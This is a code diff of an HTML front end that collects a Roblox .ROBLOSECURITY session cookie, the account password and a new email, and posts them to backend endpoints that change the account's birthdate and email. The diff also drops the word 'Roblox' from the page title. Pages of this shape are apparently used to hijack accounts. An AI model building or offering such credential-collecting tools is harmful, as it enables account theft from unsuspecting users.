@@ -3,181 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Account Automation API</title>
+    <title>Account Automation API</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
-            background: linear-gradient(135deg, #0f0f13 0%, #1a1a2e 100%); 
-            color: #e0e0e0; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            min-height: 100vh; 
-            padding: 20px; 
-        }
-        .card { 
-            background: rgba(26, 26, 36, 0.95); 
-            border: 1px solid #2a2a3a; 
-            border-radius: 20px; 
-            padding: 40px; 
-            width: 100%; 
-            max-width: 450px; 
-            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
-            backdrop-filter: blur(10px);
-        }
-        h1 { 
-            font-size: 22px; 
-            margin-bottom: 8px; 
-            color: #fff; 
-            text-align: center; 
-        }
-        .subtitle {
-            text-align: center;
-            color: #888;
-            font-size: 13px;
-            margin-bottom: 28px;
-        }
-        label { 
-            display: block; 
-            font-size: 12px; 
-            color: #aaa; 
-            margin-bottom: 6px; 
-            margin-top: 18px; 
-            font-weight: 500;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        input { 
-            width: 100%; 
-            background: #12121a; 
-            border: 1px solid #2a2a3a; 
-            border-radius: 10px; 
-            padding: 14px; 
-            color: #fff; 
-            font-size: 14px; 
-            outline: none; 
-            transition: all 0.2s;
-        }
-        input:focus { 
-            border-color: #0066ff; 
-            box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.1);
-        }
-        input::placeholder { color: #555; }
-        .btn-group { 
-            display: flex; 
-            gap: 12px; 
-            margin-top: 28px; 
-        }
-        .btn { 
-            flex: 1; 
-            padding: 16px; 
-            border: none; 
-            border-radius: 10px; 
-            color: #fff; 
-            font-size: 14px; 
-            font-weight: 600; 
-            cursor: pointer; 
-            transition: all 0.2s; 
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-        .btn-bday { 
-            background: linear-gradient(135deg, #8b5cf6, #a855f7); 
-            box-shadow: 0 4px 15px rgba(139, 92, 246, 0.3);
-        }
-        .btn-email { 
-            background: linear-gradient(135deg, #0066ff, #00b4ff); 
-            box-shadow: 0 4px 15px rgba(0, 102, 255, 0.3);
-        }
-        .btn:hover { 
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
-        }
-        .btn:disabled { 
-            opacity: 0.5; 
-            cursor: not-allowed;
-            transform: none;
-        }
-        .result { 
-            margin-top: 20px; 
-            padding: 16px; 
-            border-radius: 12px; 
-            font-size: 14px; 
-            display: none; 
-            text-align: center;
-            animation: slideIn 0.3s ease;
-        }
-        @keyframes slideIn {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .result.success { 
-            background: rgba(34, 197, 94, 0.1); 
-            color: #22c55e; 
-            border: 1px solid rgba(34, 197, 94, 0.3); 
-        }
-        .result.error { 
-            background: rgba(239, 68, 68, 0.1); 
-            color: #ef4444; 
-            border: 1px solid rgba(239, 68, 68, 0.3); 
-        }
-        .result.warning { 
-            background: rgba(245, 158, 11, 0.1); 
-            color: #f59e0b; 
-            border: 1px solid rgba(245, 158, 11, 0.3); 
-        }
-        .spinner {
-            width: 16px;
-            height: 16px;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-top-color: #fff;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .info-box {
-            background: rgba(0, 102, 255, 0.1);
-            border: 1px solid rgba(0, 102, 255, 0.2);
-            border-radius: 8px;
-            padding: 12px;
-            margin-top: 16px;
-            font-size: 12px;
-            color: #88aaff;
-            display: none;
-        }
-        .info-box.show { display: block; }
+        body { font-family: -apple-system, sans-serif; background: #0f0f13; color: #e0e0e0; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+        .card { background: #1a1a24; border: 1px solid #2a2a3a; border-radius: 16px; padding: 36px; width: 100%; max-width: 400px; box-shadow: 0 8px 32px rgba(0,0,0,0.4); }
+        h1 { font-size: 20px; margin-bottom: 24px; color: #fff; text-align: center; }
+        label { display: block; font-size: 13px; color: #999; margin-bottom: 6px; margin-top: 16px; }
+        input { width: 100%; background: #12121a; border: 1px solid #2a2a3a; border-radius: 8px; padding: 12px; color: #fff; font-size: 14px; outline: none; }
+        input:focus { border-color: #0066ff; }
+        .btn-group { display: flex; gap: 10px; margin-top: 24px; }
+        .btn { flex: 1; padding: 14px; border: none; border-radius: 8px; color: #fff; font-size: 14px; font-weight: 600; cursor: pointer; transition: 0.2s; }
+        .btn-bday { background: linear-gradient(135deg, #8b5cf6, #c084fc); }
+        .btn-email { background: linear-gradient(135deg, #0066ff, #00b4ff); }
+        .btn:hover { opacity: 0.9; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .result { margin-top: 20px; padding: 14px; border-radius: 8px; font-size: 14px; display: none; text-align: center; }
+        .result.success { background: rgba(74,222,128,0.1); color: #4ade80; border: 1px solid rgba(74,222,128,0.3); }
+        .result.error { background: rgba(248,113,113,0.1); color: #f87171; border: 1px solid rgba(248,113,113,0.3); }
     </style>
 </head>
 <body>
     <div class="card">
-        <h1>⚙️ Roblox Automation API</h1>
-        <p class="subtitle">Birthdate & Email Updater</p>
+        <h1>⚙️ Account Setup API</h1>
         
-        <label>Roblox Cookie (.ROBLOSECURITY)</label>
-        <input type="password" id="cookie" placeholder="Paste your .ROBLOSECURITY cookie..." />
+        <label>Roblox Cookie</label>
+        <input type="password" id="cookie" placeholder="Paste .ROBLOSECURITY..." />
 
         <label>Account Password</label>
-        <input type="password" id="password" placeholder="Enter current password..." />
+        <input type="password" id="password" placeholder="Current password..." />
 
-        <label>New Email (Email Service Only)</label>
-        <input type="email" id="email" placeholder="Enter new email address..." />
+        <label>New Email (Only for Email Service)</label>
+        <input type="email" id="email" placeholder="New email to attach..." />
 
         <div class="btn-group">
-            <button class="btn btn-bday" id="bdayBtn" onclick="runService('/api/update-birthdate', 'bdayBtn')">
-                <span>🎂</span> Set Birthdate
-            </button>
-            <button class="btn btn-email" id="emailBtn" onclick="runService('/api/update-email', 'emailBtn')">
-                <span>📧</span> Set Email
-            </button>
-        </div>
-
-        <div class="info-box" id="infoBox">
-            ⏳ This may take 30-60 seconds while we process the verification...
+            <button class="btn btn-bday" id="bdayBtn" onclick="runService('/api/update-birthdate', 'bdayBtn')">Set Birthdate</button>
+            <button class="btn btn-email" id="emailBtn" onclick="runService('/api/update-email', 'emailBtn')">Set Email</button>
         </div>
 
         <div class="result" id="result"></div>
@@ -189,72 +50,41 @@
             const password = document.getElementById('password').value.trim();
             const email = document.getElementById('email').value.trim();
 
-            if (!cookie || !password) {
-                showResult('Cookie and Password are required.', 'error');
-                return;
-            }
-            if (endpoint === '/api/update-email' && !email) {
-                showResult('Email is required for the Email service.', 'error');
-                return;
-            }
+            if (!cookie || !password) return alert("Cookie and Password are required.");
+            if (endpoint === '/api/update-email' && !email) return alert("Email is required for the Email service.");
 
             const activeBtn = document.getElementById(btnId);
             const otherBtn = document.getElementById(btnId === 'bdayBtn' ? 'emailBtn' : 'bdayBtn');
-            const infoBox = document.getElementById('infoBox');
             const resultEl = document.getElementById('result');
             
             activeBtn.disabled = true;
             otherBtn.disabled = true;
-            const originalText = activeBtn.innerHTML;
-            activeBtn.innerHTML = '<div class="spinner"></div> Processing...';
-            infoBox.classList.add('show');
+            const originalText = activeBtn.textContent;
+            activeBtn.textContent = "⏳ Running...";
             resultEl.style.display = 'none';
 
             try {
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 120000); // 2 minute timeout
-
                 const resp = await fetch(endpoint, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ cookie, password, email }),
-                    signal: controller.signal
+                    body: JSON.stringify({ cookie, password, email })
                 });
-                clearTimeout(timeoutId);
 
                 const data = await resp.json();
                 
-                if (data.success) {
-                    showResult('✅ ' + data.message, 'success');
-                } else {
-                    // Handle specific error messages
-                    let errorMsg = data.error || 'Unknown error occurred';
-                    if (errorMsg.includes('No password option')) {
-                        showResult('❌ ' + errorMsg + '<br><small>This account may not have password verification enabled.</small>', 'warning');
-                    } else {
-                        showResult('❌ Error: ' + errorMsg, 'error');
-                    }
-                }
+                resultEl.className = 'result ' + (data.success ? 'success' : 'error');
+                resultEl.textContent = data.success ? "✅ " + data.message : "❌ Error: " + data.error;
+                resultEl.style.display = 'block';
 
             } catch (err) {
-                if (err.name === 'AbortError') {
-                    showResult('❌ Request timed out. The server may be busy.', 'error');
-                } else {
-                    showResult('❌ Server failed to respond. Please try again.', 'error');
-                }
+                resultEl.className = 'result error';
+                resultEl.textContent = "❌ Server failed to respond.";
+                resultEl.style.display = 'block';
             } finally {
                 activeBtn.disabled = false;
                 otherBtn.disabled = false;
-                activeBtn.innerHTML = originalText;
-                infoBox.classList.remove('show');
+                activeBtn.textContent = originalText;
             }
-        }
-
-        function showResult(message, type) {
-            const resultEl = document.getElementById('result');
-            resultEl.className = 'result ' + type;
-            resultEl.innerHTML = message;
-            resultEl.style.display = 'block';
         }
     </script>
 </body>
